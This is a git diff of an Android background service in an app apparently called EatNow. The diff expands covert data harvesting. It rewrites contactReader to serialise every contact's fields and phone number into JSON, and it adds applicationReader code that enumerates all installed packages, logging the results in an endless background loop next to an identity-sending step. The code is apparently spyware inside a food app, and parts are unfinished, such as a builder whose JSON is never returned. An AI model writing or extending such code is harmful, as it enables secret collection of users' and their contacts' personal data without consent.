@@ -8,6 +8,8 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.os.IBinder;
 import android.provider.ContactsContract;
@@ -20,6 +22,7 @@ import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.util.ArrayList;
+import java.util.List;
 
 /**
  * Created by Ludovic Zipsin on 30/10/16.
@@ -53,8 +56,8 @@ public class BGService extends Service {
                 while(true)
                 {
                     try {
+                        Log.d("GBService", applicationReader().toString());
                         //Log.v("BGService", formatArray("accountReader", accountReader()));
-                        Log.v("BGService", formatArray("contactReader", contactReader()));
                         Thread.sleep(10*SECONDE); // 5*MINUTE
                         if (!known){
                             Log.i("BGService", "Identity not sended. Sending know... (value = " + Boolean.toString(known) + ")");
@@ -96,43 +99,51 @@ public class BGService extends Service {
         return fileList;
     }
 
-    private ArrayList<String> contactReader(){
-        ArrayList<String> contactList = new ArrayList<>();
-        ContentResolver cr = EatNowApplication.getAppInstance().getContentResolver(); //Activity/Application android.content.Context
-        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-        int counter = 0;
-        if(cursor.moveToFirst())
-        {
-            do
-            {
-                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-                String[] infoArray = cursor.getColumnNames();
-                String contact = "{";
-                for (String string : infoArray){
-                    contact += cursor.getString(cursor.getColumnIndex(string));
-                    contact += ",";
-                    Log.i("BGService", "field... " + string);
-                }
-                counter++;
-
-                if(Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0)
-                {
-                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",new String[]{ id }, null);
-                    while (pCur.moveToNext())
-                    {
-                        String contactNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        contact += contactNumber;
-                        contact += "}";
-                        break;
+    /**
+     * @return JSONObject containing all the information on contact
+     */
+    private JSONObject contactReader(){
+        JSONObject jsonFinal = new JSONObject();
+        JSONArray jsonContactArray = new JSONArray();
+        JSONObject jsonContact = null;
+        ContentResolver contentResolver = EatNowApplication.getAppInstance().getContentResolver(); //Activity/Application android.content.Context
+        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+        int counter = 0; // to know the number of contact
+        try {
+            if(cursor.moveToFirst()) {
+                do {
+                    counter++;
+                    jsonContact = new JSONObject();
+                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+                    jsonContact.put("id", id);
+                    String[] infoArray = cursor.getColumnNames();
+                    for (String string : infoArray){
+                        jsonContact.put(string, cursor.getString(cursor.getColumnIndex(string)));
                     }
-                    pCur.close();
-                }
-                Log.v("BGService", "contact number " + Integer.toString(counter) + ": " + contact);
-            } while (cursor.moveToNext()) ;
+                    if(Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+                        Cursor cursorPhoneNumber = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",new String[]{ id }, null);
+                        while (cursorPhoneNumber.moveToNext()) {
+                            String contactNumber = cursorPhoneNumber.getString(cursorPhoneNumber.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                            jsonContact.put("customFetchPhoneNumber", contactNumber);
+                            break;
+                        }
+                        cursorPhoneNumber.close();
+                    }
+                    jsonContactArray.put(jsonContact);
+                } while (cursor.moveToNext()) ;
+            }
+            jsonFinal.put("number", counter);
+            jsonFinal.put("data", jsonContactArray);
+            jsonFinal.put("dataType", "contact");
+        } catch (JSONException jsonException){
+            jsonException.printStackTrace();
         }
-        return contactList;
+        return jsonFinal;
     }
 
+    /**
+     * @return JSONObject containing all information on account (name and type).
+     */
     private JSONObject accountReader(){
         AccountManager manager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
         Account[] list = manager.getAccounts();
@@ -163,6 +174,26 @@ public class BGService extends Service {
 
     private ArrayList<String> applicationReader(){
         ArrayList<String> fileList = new ArrayList<>();
+        // TODO fun stuff
+        JSONObject jsonFinal = new JSONObject();
+        JSONArray jsonAppArray = new JSONArray();
+        PackageManager pm = getPackageManager();
+        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
+        int appCounter = 1;
+        try {
+            jsonFinal.put("dataType","application");
+            for (ApplicationInfo applicationInfo : apps) {
+                appCounter++;
+                String packageName = applicationInfo.toString();
+                String[] packageArray = packageName.split(" ");
+                packageName = packageArray[1];
+                jsonAppArray.put(packageName.substring(0, packageName.length() - 1));
+            }
+            jsonFinal.put("number",appCounter);
+            jsonFinal.put("data", jsonAppArray);
+        } catch (JSONException jsonException){
+            jsonException.printStackTrace();
+        }
         // TODO fun stuff
         return fileList;
     }
